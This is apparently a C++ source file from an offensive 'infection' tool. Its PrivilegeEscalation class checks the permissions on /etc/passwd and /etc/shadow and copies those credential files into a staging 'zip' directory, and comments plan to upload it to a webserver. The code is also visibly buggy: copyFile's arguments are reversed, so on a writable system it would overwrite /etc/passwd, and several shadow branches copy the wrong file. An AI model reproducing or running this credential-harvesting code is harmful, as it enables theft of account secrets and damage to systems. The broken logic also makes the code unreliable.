#include "Infection.h"

FileInformations PrivilegeEscalation::GetFileInformations(const char* fileName){
	struct stat fileMetaInformations;
	struct FileInformations infos;
	//printf("[+] File Informations : %s\n", fileName);
	if(stat(fileName, &fileMetaInformations) < 0){
		return infos;
	}
	infos.filePermissions.append(S_ISDIR(fileMetaInformations.st_mode) ? "d" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IRUSR) ? "r" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWUSR) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXUSR) ? "x" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IRGRP) ? "r" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWGRP) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXGRP) ? "x" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IROTH) ? "r" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWOTH) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXOTH) ? "x" : "-");
	//File Name
	infos.fileNameAndDir = fileName;
	//File Other Informations
	infos.fileSize = fileMetaInformations.st_size;
	infos.fileLinks = fileMetaInformations.st_nlink;
	infos.fileiNode = fileMetaInformations.st_ino;
	//File User and group
	struct passwd *fileUser = getpwuid(fileMetaInformations.st_uid);
	if(fileUser != 0){
		infos.fileUserOwner = fileUser->pw_name;
	} else {
		//log2File("ERROR-logs.txt", "Can't get fileUserOwner for file: " + infos.fileNameAndDir);
	}
	struct group *fileGroup = getgrgid(fileMetaInformations.st_gid);
	if(fileGroup != 0){
		infos.fileGroupOwner = fileGroup->gr_name;
	} else {
		//log2File("ERROR-logs.txt", "Can't get fileGroupOwner for file: " + infos.fileNameAndDir);
	}
	return infos;	
}

bool PrivilegeEscalation::checkDir(std::string fileName, bool createFile){
	if(std::experimental::filesystem::exists(fileName)){
		return true;
	} else {
		if(createFile && !std::experimental::filesystem::exists(fileName)){
			std::experimental::filesystem::create_directory(fileName);
		}
		return true;
	}
	return false;
}

bool PrivilegeEscalation::isEtcPasswdWriteable(){
    FileInformations PasswdFile = GetFileInformations("/etc/passwd");

	//If user and group is root and file are not writable by others 
	if(PasswdFile.fileUserOwner == "root" && PasswdFile.filePermissions[8] != 'w' || PasswdFile.fileGroupOwner == "root" && PasswdFile.filePermissions[8] != 'w'){
		std::cout << "\033[1;31m[+] /etc/passwd file is only writable by root, im going to make a copy of the file and put it in the ZIP directory, it might be useful later ;)\033[0m\n";
		//Create ZIP Directory
		if(checkDir("zip", true)){
			if(PasswdFile.filePermissions[4] == 'r' || PasswdFile.filePermissions[7] == 'r'){
				if(checkDir("zip/passwd", false)){
					std::experimental::filesystem::remove("zip/passwd");
					copyFile("/etc/passwd", "zip");
					return true;
				} else {
					copyFile("/etc/passwd", "zip");
					return true;
				}
			} else {
				std::cout << "[-] Unable to read file /etc/passwd !" << std::endl;
				return false;
			}
			return false;
		} 
		//Make a copy of etcpasswd
		//Put it in ZIP Directory
		return false;
		//If user and group is root but others are able to write to the file
	} else if(PasswdFile.fileUserOwner == "root" && PasswdFile.filePermissions[8] == 'w' || PasswdFile.fileGroupOwner == "root" && PasswdFile.filePermissions[8] == 'w'){
		std::cout <<"\033[1;31m[+] /etc/passwd permissions are not secure, any other user than root can write to the file !\033[0m\n";
		//Try to write to the file
		//If success try to elevate privileges with the new password set !
		//Else put a copy of /etc/passwd in a random ZIP Directory
		if(PasswdFile.filePermissions[4] == 'r' || PasswdFile.filePermissions[7] == 'r'){
			if(checkDir("zip", true)){
				if(checkDir("zip/passwd", false)){
					std::experimental::filesystem::remove("zip/passwd");
					copyFile("/etc/passwd", "zip");
					//The zip directory will be send out to a PHP Webserver (need to implement)
					return true;
				} else {
					copyFile("/etc/passwd", "zip");
					//The zip directory will be send out to a PHP Webserver (need to implement)
					return true;
				}
			}
		} else {
			std::cout << "[-] Unable to read /etc/passwd" << std::endl;
			return false;			
		}
		std::cout << "[-] Unable to read /etc/passwd with the current permissions !" << std::endl;
		return false;
	//If fileUser is root OR fileGroup is root and is at least writable by groups or user or others
	} else if(PasswdFile.fileUserOwner != "root" && PasswdFile.filePermissions[2] == 'w' || PasswdFile.filePermissions[5] == 'w' || PasswdFile.filePermissions[8] == 'w' || PasswdFile.fileGroupOwner != "root" && PasswdFile.filePermissions[2] == 'w' || PasswdFile.filePermissions[5] == 'w' || PasswdFile.filePermissions[8] == 'w'){
		//try to Write 2 the file and change root passwd
		std::cout << "\033[1;31m[+] /etc/passwd permissions are not secure, any other user than root can write to the file !\033[1;31m\n";
		if(checkDir("zip", true)){
			if(checkDir("zip/passwd", false)){
				if(PasswdFile.filePermissions[4] == 'r' || PasswdFile.filePermissions[7] == 'r'){
				std::experimental::filesystem::remove("zip/passwd");
				copyFile("/etc/passwd", "zip");
				return true;
				} else {
					std::cout << "[-] Unable to read file /etc/passwd" << std::endl;
					return false;
				}
			} else {
				if(PasswdFile.filePermissions[4] == 'r' || PasswdFile.filePermissions[7] == 'r'){
					copyFile("/etc/passwd" , "zip");
					return true;
				} else {
					std::cout << "[-] Unable to read file /etc/passwd" << std::endl;
					return false;
				}
			}
		} else {
			std::cout << "[-] Unable to read file /etc/passwd";
			return false;
		}
	}
    return false;
}

bool PrivilegeEscalation::copyFile(std::string destination, std::string source){
	std::ifstream src(source, std::ios::binary);
	std::ofstream dst(destination, std::ios::binary);
	dst << src.rdbuf();
	return true;
}


bool PrivilegeEscalation::isEtcShadowWriteable(){
	FileInformations ShadowFile = GetFileInformations("/etc/shadow");
	
	//If user and group is root and file are not writeable by others
	if(ShadowFile.fileUserOwner == "root" && ShadowFile.filePermissions[8] != 'w' && ShadowFile.fileGroupOwner == "shadow" || ShadowFile.fileGroupOwner == "root" && ShadowFile.filePermissions[8] != 'w' && ShadowFile.fileGroupOwner != "shadow"){
		std::cout << "\033[1;31m[+] /etc/shadow file is only readable/writable by root !\033[0m\n";
		if(checkDir("zip", true)){
			if(checkDir("zip/shadow", false)){
				if(ShadowFile.filePermissions[4] == 'r' || ShadowFile.filePermissions[7] == 'r'){
					std::experimental::filesystem::remove("zip/shadow");
					copyFile("/etc/passwd", "zip");
					return true;
				} else {
					std::cout << "[-] Unable to read /etc/shadow !" << std::endl;
					return false;
				}
			} 
		} else {
			if(ShadowFile.filePermissions[4] == 'r' || ShadowFile.filePermissions[7] == 'r'){
				copyFile("/etc/passwd", "zip");
				return true;
			} else {
				std::cout << "[-] Unable to read /etc/shadow !" << std::endl;
				return false;
			}
		}
		return false;
	} else if(ShadowFile.fileUserOwner == "root" && ShadowFile.filePermissions[8] == 'w' || ShadowFile.fileGroupOwner == "root" && ShadowFile.filePermissions[8] == 'w'){
		std::cout << "\033[1;31m[+] /etc/shadow permissions are not secure, any other user than root can write to the file !\033[0m\n";
		if(checkDir("zip", true)){
			if(checkDir("zip/shadow", false)){
				if(ShadowFile.filePermissions[4] == 'r' || ShadowFile.filePermissions[7] == 'r'){
					std::experimental::filesystem::remove("zip/shadow");
					copyFile("/etc/shadow", "zip");
					return true;
				} else {
					std::cout << "[-] Unable to read /etc/shadow !" << std::endl;
					return false;
				}
			} 
		} else {
			if(ShadowFile.filePermissions[4] == 'r' || ShadowFile.filePermissions[7] == 'r'){
				copyFile("/etc/shadow", "zip");
				return true;
			} else {
				std::cout << "[-] Unable to read /etc/shadow !" << std::endl;
				return false;
			}
			return false;
		}
		return true;
	} else if(ShadowFile.fileUserOwner != "root" && ShadowFile.filePermissions[2] == 'w' || ShadowFile.filePermissions[5] == 'w' || ShadowFile.filePermissions[8] == 'w' || ShadowFile.fileGroupOwner != "root" && ShadowFile.filePermissions[2] == 'w' || ShadowFile.filePermissions[5] == 'w' || ShadowFile.filePermissions[8] == 'w'){
		std::cout << "\033[1;31m[+] /etc/shadow permissions are not secure, we may be able to write to it !\033[0m\n";
		if(checkDir("zip", true)){
			if(checkDir("zip/shadow", false)){
				if(ShadowFile.filePermissions[4] == 'r' && ShadowFile.filePermissions[7] == 'r'){
					std::experimental::filesystem::remove("zip/shadow");
					copyFile("/etc/shadow", "zip");
					return true;
				} else {
					std::cout << "[-] Unable to read /etc/shadow !" << std::endl;
					return false;
				}
			} 
		} else {
			if(ShadowFile.filePermissions[4] == 'r' && ShadowFile.filePermissions[7] == 'r'){
				copyFile("/etc/shadow", "zip");
				return true;
			} else{
				std::cout << "[-] Unable to read /etc/shadow" << std::endl;
				return false;
			}
		}
	}
	return false;
}